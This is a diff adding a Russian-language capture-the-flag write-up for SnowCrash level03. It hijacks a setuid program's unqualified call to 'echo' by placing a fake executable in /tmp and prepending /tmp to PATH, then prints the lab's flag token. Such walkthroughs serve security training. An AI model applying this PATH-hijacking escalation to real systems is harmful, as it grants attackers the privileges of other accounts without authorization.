@@ -1,0 +1,31 @@
+В домашнем каталоге есть исполняемый файл
+
+ls -l
+-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
+
+Программа выполняет системный вызов для запуска echo, используя /usr/bin/env:
+
+level03@SnowCrash:~$ ltrace ./level03
+__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
+getegid()                                                               = 2003
+geteuid()                                                               = 2003
+setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                     = 0
+setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                     = 0
+system("/usr/bin/env echo Exploit me"Exploit me
+...
+
+Необходимо создать собственный исполняемый файл echo
+Поскольку в файле установлен бит suid, все команды будут выполняться с правами владельца файла (flag03),
+поэтому нужно заставить программу работать getflag вместо echo
+
+
+level03@SnowCrash:~$ echo getflag > /tmp/echo && chmod +x /tmp/echo
+
+Затем мы указываем bash сначала искать исполняемый файл в /tmp, добавляя /tmp в начале переменной окружения $PATH:
+
+export PATH=/tmp:$PATH && echo $PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+
+Теперь запустим программу
+
+level03@SnowCrash:~$ ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
